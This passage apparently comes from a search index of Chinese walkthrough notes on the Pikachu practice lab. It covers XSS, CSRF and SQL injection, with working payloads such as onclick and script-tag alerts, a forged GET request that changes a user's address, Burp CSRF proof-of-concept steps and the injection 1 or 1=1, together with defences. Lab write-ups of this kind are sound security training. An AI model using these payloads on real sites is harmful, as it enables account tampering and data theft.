\u53ef\u9009\u3002\u89c4\u5b9a\u5982\u4f55\u5904\u7406\u5f15\u53f7\u3001\u65e0\u6548\u7684\u7f16\u7801\u4ee5\u53ca\u4f7f\u7528\u54ea\u79cd\u6587\u6863\u7c7b\u578b\u3002\u53ef\u7528\u7684\u5f15\u53f7\u7c7b\u578b\uff1a  ENT_COMPAT - \u9ed8\u8ba4\u3002\u4ec5\u7f16\u7801\u53cc\u5f15\u53f7\u3002 ENT_QUOTES - \u7f16\u7801\u53cc\u5f15\u53f7\u548c\u5355\u5f15\u53f7\u3002 ENT_NOQUOTES - \u4e0d\u7f16\u7801\u4efb\u4f55\u5f15\u53f7\u3002 | | character-set | \u53ef\u9009\u3002\u4e00\u4e2a\u89c4\u5b9a\u4e86\u8981\u4f7f\u7528\u7684\u5b57\u7b26\u96c6\u7684\u5b57\u7b26\u4e32\u3002 | | double_encode | \u53ef\u9009\u3002\u5e03\u5c14\u503c\uff0c\u89c4\u5b9a\u4e86\u662f\u5426\u7f16\u7801\u5df2\u5b58\u5728\u7684 HTML \u5b9e\u4f53\u3002 |</p> <p>\u63d0\u793a\uff1a\u5982\u9700\u628a\u7279\u6b8a\u7684 HTML \u5b9e\u4f53\u8f6c\u6362\u56de\u5b57\u7b26\uff0c\u8bf7\u4f7f\u7528 htmlspecialchars_decode() \u51fd\u6570\u3002 1. \u6211\u4eec\u8fd8\u662f\u5148\u8f93\u5165\u4e00\u6bb5\u5b57\u7b26\u4e32\u53bb\u5c1d\u8bd5\u4e00\u4e0b123abc\u2019\u201c&lt;&gt;#$%\uff0c\u63d0\u4ea4\u540e\u67e5\u770b\u7f51\u9875\u6e90\u4ee3\u7801\u3002  2. \u6211\u4eec\u53d1\u73b0\uff0c\u9664\u4e86\u5355\u5f15\u53f7\u5916\uff0c\u5176\u4ed6\u7684\u7279\u6b8a\u5b57\u7b26\u90fd\u88ab\u8fdb\u884c\u4e86\u7f16\u7801\u3002\u6240\u4ee5\u6211\u4eec\u8f93\u5165<code>q' onclick='alert(123)'</code>\u7b2c\u4e00\u4e2a\u5355\u5f15\u53f7\u662f\u5bf9\u524d\u9762\u8fdb\u884c\u95ed\u5408\u3002\u8f93\u5165\u540e\u70b9\u51fb\u53d1\u73b0\u6210\u529f\u5f39\u7a97\u3002 \u8fd9\u662f\u56e0\u4e3a\u6b64\u5904\u7684htmlspecialchars()\u51fd\u6570\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u201c\u53ef\u7528\u7684\u5f15\u53f7\u7c7b\u578b\u201d\u5e76\u6ca1\u6709\u6b63\u786e\u9009\u62e9\uff0c\u82e5\u9009\u62e9\u6210\u201cENT QUOTES -\u7f16\u7801\u53cc\u5f15\u53f7\u548c\u5355\u5f15\u53f7\u201d\u60c5\u51b5\u5e94\u8be5\u4f1a\u597d\u5f88\u591a\u3002  ### 2x09 xss\u4e4bhref\u8f93\u51fa  1. \u6253\u5f00xss\u4e4bherf\u8f93\u51fa\uff0c\u8f93\u5165Javascript:alert(123)\uff0c\u4e0d\u542b\u6709\u7279\u6b8a\u5b57\u7b26\u3002 2. \u6211\u4eec\u770b\u4e00\u770b\u7f51\u9875\u6e90\u4ee3\u7801\uff0c\u5982\u56fe 3. \u53d1\u73b0\u6211\u4eec\u7684\u4ee3\u7801\u5d4c\u5165\u4e86\u6e90\u4ee3\u7801\u4e2d\uff0c\u70b9\u51fb\u540e\u4f1a\u88ab\u6267\u884c\uff0c\u51fa\u73b0\u5f39\u7a97\u3002</p> <p>\u67e5\u8d44\u6599\u5f97\uff1a\u5728\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u505a\u51fa\u76f8\u5e94\u9632\u8303\uff0c\u53ea\u5141\u8bb8http,https\uff0c\u5176\u6b21\u5728\u8fdb\u884chtmlspecialchars\u5904\u7406\u3002</p> <p>### 2x10 xss\u4e4bjs\u8f93\u51fa  1. \u6211\u4eec\u5728\u7f51\u9875\u5185\u968f\u4fbf\u8f93\u5165\u4e00\u4e9b\u4e1c\u897f\uff0c\u7136\u540e\u8fdb\u6e90\u4ee3\u7801\u91cc\u770b\u4e00\u770b\uff0c\u8fd9\u91cc\u4ee5abc\u4e3a\u4f8b\u3002 2. \u540c\u6837\uff0c\u6211\u4eec\u5c1d\u8bd5\u53bb\u6784\u9020\u95ed\u5408\uff0c\u8f93\u5165<code>x'&lt;/script&gt;&lt;script&gt;alert('xss')&lt;/script&gt;</code>\uff0c\u53d1\u73b0\u6210\u529f\u5f39\u7a97</p>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#3-csrf","title":"3 CSRF","text":"<p>CSRF(\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020)\u6982\u8ff0 Cross-site request forgery \u7b80\u79f0\u4e3a\u201cCSRF\u201d\uff0c\u5728CSRF\u7684\u653b\u51fb\u573a\u666f\u4e2d\u653b\u51fb\u8005\u4f1a\u4f2a\u9020\u4e00\u4e2a\u8bf7\u6c42\uff08\u8fd9\u4e2a\u8bf7\u6c42\u4e00\u822c\u662f\u4e00\u4e2a\u94fe\u63a5\uff09\uff0c\u7136\u540e\u6b3a\u9a97\u76ee\u6807\u7528\u6237\u8fdb\u884c\u70b9\u51fb\uff0c\u7528\u6237\u4e00\u65e6\u70b9\u51fb\u4e86\u8fd9\u4e2a\u8bf7\u6c42\uff0c\u6574\u4e2a\u653b\u51fb\u5c31\u5b8c\u6210\u4e86\u3002\u6240\u4ee5CSRF\u653b\u51fb\u4e5f\u6210\u4e3a\"one click\"\u653b\u51fb\u3002 \u5f88\u591a\u4eba\u641e\u4e0d\u6e05\u695aCSRF\u7684\u6982\u5ff5\uff0c\u751a\u81f3\u6709\u65f6\u5019\u4f1a\u5c06\u5176\u548cXSS\u6df7\u6dc6,\u66f4\u6709\u751a\u8005\u4f1a\u5c06\u5176\u548c\u8d8a\u6743\u95ee\u9898\u6df7\u4e3a\u4e00\u8c08,\u8fd9\u90fd\u662f\u5bf9\u539f\u7406\u6ca1\u641e\u6e05\u695a\u5bfc\u81f4\u7684\u3002 \u8fd9\u91cc\u5217\u4e3e\u4e00\u4e2a\u573a\u666f\u89e3\u91ca\u4e00\u4e0b\uff0c\u5e0c\u671b\u80fd\u591f\u5e2e\u52a9\u4f60\u7406\u89e3\u3002</p> <p>\u573a\u666f\u9700\u6c42\uff1a \u5c0f\u9ed1\u60f3\u8981\u4fee\u6539\u5927\u767d\u5728\u8d2d\u7269\u7f51\u7ad9tianxiewww.xx.com\u4e0a\u586b\u5199\u7684\u4f1a\u5458\u5730\u5740\u3002\u5148\u770b\u4e0b\u5927\u767d\u662f\u5982\u4f55\u4fee\u6539\u81ea\u5df1\u7684\u5bc6\u7801\u7684\uff1a\u767b\u5f55---\u4fee\u6539\u4f1a\u5458\u4fe1\u606f\uff0c\u63d0\u4ea4\u8bf7\u6c42---\u4fee\u6539\u6210\u529f\u3002 \u6240\u4ee5\u5c0f\u9ed1\u60f3\u8981\u4fee\u6539\u5927\u767d\u7684\u4fe1\u606f\uff0c\u4ed6\u9700\u8981\u62e5\u6709\uff1a1\uff0c\u767b\u5f55\u6743\u9650 2\uff0c\u4fee\u6539\u4e2a\u4eba\u4fe1\u606f\u7684\u8bf7\u6c42\u3002 \u4f46\u662f\u5927\u767d\u53c8\u4e0d\u4f1a\u628a\u81ea\u5df1xxx\u7f51\u7ad9\u7684\u8d26\u53f7\u5bc6\u7801\u544a\u8bc9\u5c0f\u9ed1\uff0c\u90a3\u5c0f\u9ed1\u600e\u4e48\u529e\uff1f</p> <p>\u4e8e\u662f\u4ed6\u81ea\u5df1\u8dd1\u5230www.xx.com\u4e0a\u6ce8\u518c\u4e86\u4e00\u4e2a\u81ea\u5df1\u7684\u8d26\u53f7\uff0c\u7136\u540e\u4fee\u6539\u4e86\u4e00\u4e0b\u81ea\u5df1\u7684\u4e2a\u4eba\u4fe1\u606f\uff08\u6bd4\u5982\uff1aE-mail\u5730\u5740\uff09\uff0c\u4ed6\u53d1\u73b0\u4fee\u6539\u7684\u8bf7\u6c42\u662f\uff1a \u3010http://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Change\u3011 \u4e8e\u662f\uff0c\u4ed6\u5b9e\u65bd\u4e86\u8fd9\u6837\u4e00\u4e2a\u64cd\u4f5c\uff1a\u628a\u8fd9\u4e2a\u94fe\u63a5\u4f2a\u88c5\u4e00\u4e0b\uff0c\u5728\u5c0f\u767d\u767b\u5f55xxx\u7f51\u7ad9\u540e\uff0c\u6b3a\u9a97\u4ed6\u8fdb\u884c\u70b9\u51fb\uff0c\u5c0f\u767d\u70b9\u51fb\u8fd9\u4e2a\u94fe\u63a5\u540e\uff0c\u4e2a\u4eba\u4fe1\u606f\u5c31\u88ab\u4fee\u6539\u4e86,\u5c0f\u9ed1\u5c31\u5b8c\u6210\u4e86\u653b\u51fb\u76ee\u7684\u3002</p> <p>\u4e3a\u5565\u5c0f\u9ed1\u7684\u64cd\u4f5c\u80fd\u591f\u5b9e\u73b0\u5462\u3002\u6709\u5982\u4e0b\u51e0\u4e2a\u5173\u952e\u70b9\uff1a 1.www.xxx.com\u8fd9\u4e2a\u7f51\u7ad9\u5728\u7528\u6237\u4fee\u6539\u4e2a\u4eba\u7684\u4fe1\u606f\u65f6\u6ca1\u6709\u8fc7\u591a\u7684\u6821\u9a8c\uff0c\u5bfc\u81f4\u8fd9\u4e2a\u8bf7\u6c42\u5bb9\u6613\u88ab\u4f2a\u9020; \u56e0\u6b64\uff0c\u6211\u4eec\u5224\u65ad\u4e00\u4e2a\u7f51\u7ad9\u662f\u5426\u5b58\u5728CSRF\u6f0f\u6d1e\uff0c\u5176\u5b9e\u5c31\u662f\u5224\u65ad\u5176\u5bf9\u5173\u952e\u4fe1\u606f\uff08\u6bd4\u5982\u5bc6\u7801\u7b49\u654f\u611f\u4fe1\u606f\uff09\u7684\u64cd\u4f5c(\u589e\u5220\u6539)\u662f\u5426\u5bb9\u6613\u88ab\u4f2a\u9020\u3002</p> <p>2.\u5c0f\u767d\u70b9\u51fb\u4e86\u5c0f\u9ed1\u53d1\u7ed9\u7684\u94fe\u63a5\uff0c\u5e76\u4e14\u8fd9\u4e2a\u65f6\u5019\u5c0f\u767d\u521a\u597d\u767b\u5f55\u5728\u8d2d\u7269\u7f51\u4e0a; \u5982\u679c\u5c0f\u767d\u5b89\u5168\u610f\u8bc6\u9ad8\uff0c\u4e0d\u70b9\u51fb\u4e0d\u660e\u94fe\u63a5\uff0c\u5219\u653b\u51fb\u4e0d\u4f1a\u6210\u529f\uff0c\u53c8\u6216\u8005\u5373\u4f7f\u5c0f\u767d\u70b9\u51fb\u4e86\u94fe\u63a5\uff0c\u4f46\u5c0f\u767d\u6b64\u65f6\u5e76\u6ca1\u6709\u767b\u5f55\u8d2d\u7269\u7f51\u7ad9\uff0c\u4e5f\u4e0d\u4f1a\u6210\u529f\u3002 \u56e0\u6b64\uff0c\u8981\u6210\u529f\u5b9e\u65bd\u4e00\u6b21CSRF\u653b\u51fb\uff0c\u9700\u8981\u201c\u5929\u65f6\uff0c\u5730\u5229\uff0c\u4eba\u548c\u201d\u7684\u6761\u4ef6\u3002 \u5f53\u7136\uff0c\u5982\u679c\u5c0f\u9ed1\u4e8b\u5148\u5728xxx\u7f51\u7684\u9996\u9875\u5982\u679c\u53d1\u73b0\u4e86\u4e00\u4e2aXSS\u6f0f\u6d1e\uff0c\u5219\u5c0f\u9ed1\u53ef\u80fd\u4f1a\u8fd9\u6837\u505a\uff1a \u6b3a\u9a97\u5c0f\u767d\u8bbf\u95ee\u57cb\u4f0f\u4e86XSS\u811a\u672c\uff08\u76d7\u53d6cookie\u7684\u811a\u672c\uff09\u7684\u9875\u9762\uff0c\u5c0f\u767d\u4e2d\u62db\uff0c\u5c0f\u9ed1\u62ff\u5230\u5c0f\u767d\u7684cookie\uff0c\u7136\u540e\u5c0f\u9ed1\u987a\u5229\u767b\u5f55\u5230\u5c0f\u767d\u7684\u540e\u53f0\uff0c\u5c0f\u9ed1\u81ea\u5df1\u4fee\u6539\u5c0f\u767d\u7684\u76f8\u5173\u4fe1\u606f\u3002 \u6240\u4ee5\u8ddf\u4e0a\u9762\u6bd4\u4e00\u4e0b\uff0c\u5c31\u53ef\u4ee5\u770b\u51faCSRF\u4e0eXSS\u7684\u533a\u522b\uff1aCSRF\u662f\u501f\u7528\u6237\u7684\u6743\u9650\u5b8c\u6210\u653b\u51fb\uff0c\u653b\u51fb\u8005\u5e76\u6ca1\u6709\u62ff\u5230\u7528\u6237\u7684\u6743\u9650\uff0c\u800cXSS\u662f\u76f4\u63a5\u76d7\u53d6\u5230\u4e86\u7528\u6237\u7684\u6743\u9650\uff0c\u7136\u540e\u5b9e\u65bd\u7834\u574f\u3002</p> <p>\u56e0\u6b64\uff0c\u7f51\u7ad9\u5982\u679c\u8981\u9632\u6b62CSRF\u653b\u51fb\uff0c\u5219\u9700\u8981\u5bf9\u654f\u611f\u4fe1\u606f\u7684\u64cd\u4f5c\u5b9e\u65bd\u5bf9\u5e94\u7684\u5b89\u5168\u63aa\u65bd\uff0c\u9632\u6b62\u8fd9\u4e9b\u64cd\u4f5c\u51fa\u73b0\u88ab\u4f2a\u9020\u7684\u60c5\u51b5\uff0c\u4ece\u800c\u5bfc\u81f4CSRF\u3002\u6bd4\u5982\uff1a</p> <ul> <li>\u5bf9\u654f\u611f\u4fe1\u606f\u7684\u64cd\u4f5c\u589e\u52a0\u5b89\u5168\u7684token\uff1b</li> <li>\u5bf9\u654f\u611f\u4fe1\u606f\u7684\u64cd\u4f5c\u589e\u52a0\u5b89\u5168\u7684\u9a8c\u8bc1\u7801\uff1b</li> <li>\u5bf9\u654f\u611f\u4fe1\u606f\u7684\u64cd\u4f5c\u5b9e\u65bd\u5b89\u5168\u7684\u903b\u8f91\u6d41\u7a0b\uff0c\u6bd4\u5982\u4fee\u6539\u5bc6\u7801\u65f6\uff0c\u9700\u8981\u5148\u6821\u9a8c\u65e7\u5bc6\u7801\u7b49\u3002</li> </ul>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#3x01-csrfget","title":"3x01 CSRF(get)","text":"<ol> <li>\u5148\u4ee5Vince\u7684\u8eab\u4efd\u767b\u5f55\u7f51\u7ad9</li> <li>\u767b\u9646\u597d\u540e\u5c1d\u8bd5\u4fee\u6539\u4e2a\u4eba\u4fe1\u606f\uff0c\u8fd9\u91cc\u6211\u4eec\u628a\u4f4f\u5740\u6539\u4e3a\u201cabc\u201d</li> </ol> <ol> <li>\u67e5\u770bBurp\u4e2d\u6293\u5230\u7684\u6570\u636e\u5305\uff0c\u6570\u636e\u4e3a<code>GET /pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&amp;phonenum=18626545453&amp;add=abc&amp;email=vince%40pikachu.com&amp;submit=submit</code></li> <li>\u6211\u4eec\u53d1\u73b0\uff0c\u5173\u952e\u6570\u636e\u5bb9\u6613\u88ab\u4fee\u6539\uff0c\u6240\u4ee5\u6211\u4eec\u5c06\u5176\u6539\u4e3aURL\uff0c\u5e76\u5c06\u5730\u5740\u4fee\u6539\u4e3a123\uff0c<code>http://127.0.0.1/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&amp;phonenum=18626545453&amp;add=123&amp;email=vince%40pikachu.com&amp;submit=submit</code> \u5c06\u6b64URL\u53d1\u9001\u7ed9Vince\uff0c\u73b0\u5728\u6211\u4eec\u6a21\u62dfVince\u7684\u64cd\u4f5c\uff0c\u6211\u4eec\u5728\u6d4f\u89c8\u5668\u4e2d\u6253\u5f00\u6b64\u94fe\u63a5\uff0c\u53d1\u73b0\u5730\u5740\u88ab\u4fee\u6539\u4e3a\u4e86123</li> <li> <p>\u5f53\u7136\uff0c\u5982\u679c\u6b64\u65f6Vince\u9000\u51fa\u4e86\u767b\u5f55\uff0c\u5219\u70b9\u51fb\u94fe\u63a5\u540e\u4e2a\u4eba\u4fe1\u606f\u4e5f\u4e0d\u4f1a\u88ab\u4fee\u6539\u3002\u8fd9\u4e5f\u9a8c\u8bc1\u4e86CSRF\u7684\u4e24\u4e2a\u6761\u4ef6\uff1a         1 \u7f51\u7ad9\u5bf9\u654f\u611f\u4fe1\u606f\u7684\u4fee\u6539\u6ca1\u6709\u505a\u9650\u5236\uff0c\u4e5f\u6ca1\u6709token\u7b49\u5143\u7d20\u5b58\u5728(\u8bf7\u6c42\u53ef\u4ee5\u88ab\u4f2a\u9020)         2 \u88ab\u653b\u51fb\u8005\u5728\u6b64\u7f51\u7ad9\u4e3a\u767b\u9646\u72b6\u6001</p> <p>\u200b   </p> </li> </ol> <p>==\u67e5\u8d44\u6599\u540e\u53d1\u73b0\u8fd8\u6709\u4e00\u70b9==\uff1a\u786e\u8ba4\u51ed\u8bc1\u7684\u6709\u6548\u671f\uff08\u8fd9\u4e2a\u95ee\u9898\u4f1a\u63d0\u9ad8CSRF\u88ab\u5229\u7528\u7684\u6982\u7387\uff09\u867d\u7136\u9000\u51fa\u6216\u8005\u5173\u95ed\u4e86\u6d4f\u89c8\u5668\uff0c\u4f46cookie\u4ecd\u7136\u6709\u6548\uff0c\u6216\u8005session\u5e76\u6ca1\u6709\u8fc7\u671f\uff0c\u5bfc\u81f4CSRF\u653b\u51fb\u53d8\u5f97\u7b80\u5355\u3002</p>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#3x02-csrfpost","title":"3x02 CSRF(post)","text":"<ol> <li>\u4e0e\u4e0a\u4e00\u5c0f\u8282\uff0c\u6211\u4eec\u5148\u767b\u5f55\uff0c\u5e76\u5c06\u5730\u5740\u4fee\u6539\u4e3aabc</li> <li>\u5728Burp\u4e2d\u8fdb\u884c\u6293\u5305\uff0c\u56e0\u4e3a\u6b64\u65f6\u4e3apost\u8bf7\u6c42\uff0c\u6211\u4eec\u65e0\u6cd5\u7528URL\u53bb\u63d0\u4ea4\u8bf7\u6c42\uff0c\u6240\u4ee5\u6211\u4eec\u5e94\u8be5\u7528\u6293\u5305\u4fe1\u606f\u4fee\u6539\u540e\u4f2a\u9020\u4e00\u4e2a\u8868\u5355</li> <li>\u5728\u6b64\u6570\u636e\u5305\u4e0a\u53f3\u952e\uff0c\u9009\u62e9\u201cEngagement tools\u201d--\u201cGenerate CSRF PoC\u201d\uff0c\u5e76\u4fee\u6539\u5730\u5740\u4e3a12345\uff08\u8868\u5355\uff09 </li> <li>\u6b64\u5904\u6211\u4eec\u4e5f\u53ef\u4ee5\u4fee\u6539\u8868\u5355\u540e\u81ea\u5df1\u5f04\u6210url\uff0c\u4f46\u662f\u8fd9\u91cc\u5c31\u76f4\u63a5\u7528Burp\u7684\u5de5\u5177\u4e86\u3002\u70b9\u51fb\u201cTest in browser\u201d\uff0c\u70b9\u51fb\u201ccopy\u201d</li> <li>\u5c06\u6b64\u7f51\u5740\u53d1\u9001\u7ed9Vince\uff0cVince\u70b9\u51fb\u540e\u4e2a\u4eba\u4fe1\u606f\u4f1a\u88ab\u4fee\u6539\u3002  </li> </ol>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#3x03-csrf-token","title":"3x03 CSRF Token","text":"<ol> <li> <p>\u6211\u4eec\u4f9d\u65e7\u662f\u5148\u7528Vince\u7684\u8eab\u4efd\u767b\u5f55\uff0c\u5e76\u4e14\u4f9d\u65e7\u662f\u5c06\u5176\u5730\u5740\u4fee\u6539\u4e3a\u201cqwe\u201d </p> </li> <li> <p>\u6211\u4eec\u7528Burp\u6293\u5305\uff0c\u53d1\u73b0\u6293\u5230\u7684\u6570\u636e\u5305\u4e2d\u5b58\u5728token,\u54cd\u5e94\u56de\u6765\u7684\u6570\u636e\u5305\u4e5f\u5b58\u5728token\u3002</p> </li> </ol> <p></p> <ol> <li> <p>\u56e0\u6b64\uff0c\u6211\u4eec\u5c06\u6b64\u6570\u636e\u5305\u53d1\u9001\u81f3\u91cd\u653e\u5668\uff0c\u5e76\u5c06\u7b2c2\u6b65\u4e2d\u54cd\u5e94\u56de\u6765\u7684token\u590d\u5236\u7ed9\u6b64\u6570\u636e\u5305\uff0c\u5e76\u5c06\u5730\u5740\u6539\u4e3ausa\uff0c\u53d1\u9001\u3002</p> </li> <li> <p>\u53ef\u4ee5\u770b\u5230\uff0cVince\u7684\u5730\u5740\u88ab\u4fee\u6539</p> <p>\u5728CSRF\uff0c\u6211\u4eec\u53d1\u73b0\u5728get\u8bf7\u6c42\u63d0\u4ea4\u7684\u57fa\u7840\u4e0a\u589e\u52a0\u4e86Token\uff0c\u5f53\u6211\u4eec\u5237\u65b0\u9875\u9762\u65f6Token\u503c\u4f1a\u53d1\u751f\u53d8\u5316\uff0c\u8fd9\u6837\u4e5f\u5c31\u5b8c\u5168\u9632\u6b62\u4e86GRSF\u6f0f\u6d1e\u7684\u4ea7\u751f\u3002</p> </li> </ol> <p>CSRF\u4e0eXSS\u7684\u533a\u522b CSRF\u662f\u501f\u7528\u6237\u7684\u6743\u9650\u5b8c\u6210\u653b\u51fb\uff0c\u653b\u51fb\u8005\u5e76\u6ca1\u6709\u62ff\u5230\u7528\u6237\u7684\u6743\u9650\uff0c\u800cXSS\u53ef\u4ee5\u901a\u8fc7\u76d7\u53d6cookie\u6765\u76f4\u63a5\u83b7\u53d6\u7528\u6237\u6743\u9650\u6765\u5b9e\u65bd\u653b\u51fb\u3002</p>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#4-sql-inject","title":"4 SQL-Inject","text":"<p>\u5728owasp\u53d1\u5e03\u7684top10\u6392\u884c\u699c\u91cc\uff0c\u6ce8\u5165\u6f0f\u6d1e\u4e00\u76f4\u662f\u5371\u5bb3\u6392\u540d\u7b2c\u4e00\u7684\u6f0f\u6d1e\uff0c\u5176\u4e2d\u6ce8\u5165\u6f0f\u6d1e\u91cc\u9762\u9996\u5f53\u5176\u51b2\u7684\u5c31\u662f\u6570\u636e\u5e93\u6ce8\u5165\u6f0f\u6d1e\u3002 \u4e00\u4e2a\u4e25\u91cd\u7684SQL\u6ce8\u5165\u6f0f\u6d1e\uff0c\u53ef\u80fd\u4f1a\u76f4\u63a5\u5bfc\u81f4\u4e00\u5bb6\u516c\u53f8\u7834\u4ea7\uff01 SQL\u6ce8\u5165\u6f0f\u6d1e\u4e3b\u8981\u5f62\u6210\u7684\u539f\u56e0\u662f\u5728\u6570\u636e\u4ea4\u4e92\u4e2d\uff0c\u524d\u7aef\u7684\u6570\u636e\u4f20\u5165\u5230\u540e\u53f0\u5904\u7406\u65f6\uff0c\u6ca1\u6709\u505a\u4e25\u683c\u7684\u5224\u65ad\uff0c\u5bfc\u81f4\u5176\u4f20\u5165\u7684\u201c\u6570\u636e\u201d\u62fc\u63a5\u5230SQL\u8bed\u53e5\u4e2d\u540e\uff0c\u88ab\u5f53\u4f5cSQL\u8bed\u53e5\u7684\u4e00\u90e8\u5206\u6267\u884c\u3002 \u4ece\u800c\u5bfc\u81f4\u6570\u636e\u5e93\u53d7\u635f\uff08\u88ab\u8131\u88e4\u3001\u88ab\u5220\u9664\u3001\u751a\u81f3\u6574\u4e2a\u670d\u52a1\u5668\u6743\u9650\u6ca6\u9677\uff09\u3002 \u5728\u6784\u5efa\u4ee3\u7801\u65f6\uff0c\u4e00\u822c\u4f1a\u4ece\u5982\u4e0b\u51e0\u4e2a\u65b9\u9762\u7684\u7b56\u7565\u6765\u9632\u6b62SQL\u6ce8\u5165\u6f0f\u6d1e\uff1a 1.\u5bf9\u4f20\u8fdbSQL\u8bed\u53e5\u91cc\u9762\u7684\u53d8\u91cf\u8fdb\u884c\u8fc7\u6ee4\uff0c\u4e0d\u5141\u8bb8\u5371\u9669\u5b57\u7b26\u4f20\u5165\uff1b 2.\u4f7f\u7528\u53c2\u6570\u5316\uff08Parameterized Query \u6216 Parameterized Statement\uff09\uff1b 3.\u8fd8\u6709\u5c31\u662f,\u76ee\u524d\u6709\u5f88\u591aORM\u6846\u67b6\u4f1a\u81ea\u52a8\u4f7f\u7528\u53c2\u6570\u5316\u89e3\u51b3\u6ce8\u5165\u95ee\u9898,\u4f46\u5176\u4e5f\u63d0\u4f9b\u4e86\"\u62fc\u63a5\"\u7684\u65b9\u5f0f,\u6240\u4ee5\u4f7f\u7528\u65f6\u9700\u8981\u614e\u91cd!</p> <p>==SQL Inject \u6f0f\u6d1e\u653b\u51fb\u6d41\u7a0b== 01\uff1a\u6ce8\u5165\u70b9\u63a2\u6d4b      \u81ea\u52a8\u65b9\u5f0f\uff1a\u4f7f\u7528web\u6f0f\u6d1e\u626b\u63cf\u5de5\u5177\uff0c\u81ea\u52a8\u8fdb\u884c\u6ce8\u5165\u70b9\u53d1\u73b0      \u624b\u52a8\u65b9\u5f0f\uff1a\u624b\u5de5\u6784\u9020sql inject\u6d4b\u8bd5\u8bed\u53e5\u8fdb\u884c\u6ce8\u5165\u70b9\u53d1\u73b0 02\uff1a\u4fe1\u606f\u6536\u96c6      \u901a\u8fc7\u6ce8\u5165\u70b9\u53d6\u671f\u671b\u5f97\u5230\u7684\u6570\u636e   \uff081\uff09 \u73af\u5883\u4fe1\u606f\uff1a\u6570\u636e\u5e93\u7c7b\u578b\uff0c\u6570\u636e\u5e93\u7248\u672c\uff0c\u64cd\u4f5c\u7cfb\u7edf\u7248\u672c\uff0c\u7528\u6237\u4fe1\u606f\u7b49   \uff082\uff09\u6570\u636e\u5e93\u4fe1\u606f\uff1a\u6570\u636e\u5e93\u540d\u79f0\uff0c\u6570\u636e\u5e93\u8868\uff0c\u8868\u5b57\u6bb5\uff0c\u5b57\u6bb5\u5185\u5bb9\uff0c\u751a\u81f3\u52a0\u5bc6\u7684\u5185\u5bb9\u4e5f\u53ef\u80fd\u4f1a\u88ab\u7834\u89e3 03\uff1a\u83b7\u53d6\u6743\u9650 \u83b7\u53d6\u64cd\u4f5c\u7cfb\u7edf\u6743\u9650\uff1a\u901a\u8fc7\u6570\u636e\u5e93\u6267\u884cshell\uff0c\u4e0a\u4f20\u6728\u9a6c</p> <p>==\u5e38\u89c1\u7684\u6ce8\u5165\u70b9\u7c7b\u578b== \u6570\u5b57\u578b\uff1a</p> <p>SQL<pre><code>user_ id= $id\n</code></pre> \u5b57\u7b26\u578b\uff1a</p> <p>SQL<pre><code>user. id= '$id' \n</code></pre> \u641c\u7d22\u578b\uff1a</p> SQL<pre><code>text LIKE '%{$_ GET['search']}%'\"\n</code></pre>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#4x01-post","title":"4x01 \u6570\u5b57\u578b\u6ce8\u5165\uff08post\uff09","text":"<ol> <li>\u6211\u4eec\u968f\u4fbf\u9009\u62e9\u4e00\u4e2a\u6570\u5b57\u5e76\u63d0\u4ea4\uff0c\u53d1\u73b0url\u4e2d\u5e76\u6ca1\u6709\u4f20\u53c2\uff0c\u8bf4\u660e\u6211\u4eec\u7684\u8bf7\u6c42\u662f\u4ee5\u8868\u5355\u7684\u5f62\u5f0f\u53d1\u9001\u3002</li> <li> <p>\u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0c\u8fd4\u56de\u6765\u7684\u6570\u636e\u662f\u7531\u59d3\u540d\u548c\u90ae\u7bb1\u4e24\u90e8\u5206\u7ec4\u6210\uff0c\u6211\u4eec\u5728Burp\u91cc\u9762\u6293\u5305\uff0c\u5982\u56fe\uff1a</p> </li> <li> <p>\u6211\u4eec\u5c06\u6b64\u6570\u636e\u5305\u53d1\u9001\u81f3Repeater\u6a21\u5757\uff0c\u5e76\u5728\u8f93\u5165\u70b9\u6784\u9020payload\uff1a1 or 1=1\uff0c\u56e0\u4e3a\u4efb\u4f55id\u53d61=1\u90fd\u4e3a\u771f\uff0c\u6240\u4ee5\u8fd9\u6837\u4f1a\u628a\u6240\u6709\u4fe1\u606f\u90fd\u7f57\u5217\u51fa\u6765 </p> </li> </ol>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#4x02-get","title":"4x02 \u5b57\u7b26\u578b\u6ce8\u5165\uff08get\uff09","text":"<ol> <li>\u6211\u4eec\u968f\u4fbf\u8f93\u5165\u4e00\u6bb5\u5b57\u7b26\uff0c\u6b64\u5904\u4ee5\u201cqwer\u201d\u4e3a\u4f8b\uff0c\u53d1\u73b0\u6211\u4eec\u7684\u8bf7\u6c42\u662f\u5728url\u4e2d\u63d0\u4ea4\u7684\uff0c\uff0c\u800c\u82e5\u6211\u4eec\u4ee5vince\u4e3a\u4f8b\uff0c\u53d1\u73b0\u6b63\u786e\u8fd4\u56de\u4e86\u6570\u636e\uff0c\u800c\u4e14\u4ecd\u662f\u7531\u59d3\u540d\u548c\u90ae\u7bb1\u4e24\u90e8\u5206\u6784\u6210 </li> <li>\u5b57\u7b26\u578b\u6ce8\u5165\uff0c\u6211\u4eec\u731c\u6d4bsql\u8bed\u53e5\u5982\u4e0b\uff1a</li> </ol> <p>SQL<pre><code>select \u5b57\u6bb51\uff0c\u5b57\u6bb52 from \u8868\u540d where username = '111';\n</code></pre> \u540e\u53f0\u63a5\u6536\u5e94\u8be5\u662f\uff1a<code>$uname=$_GET['username']</code> 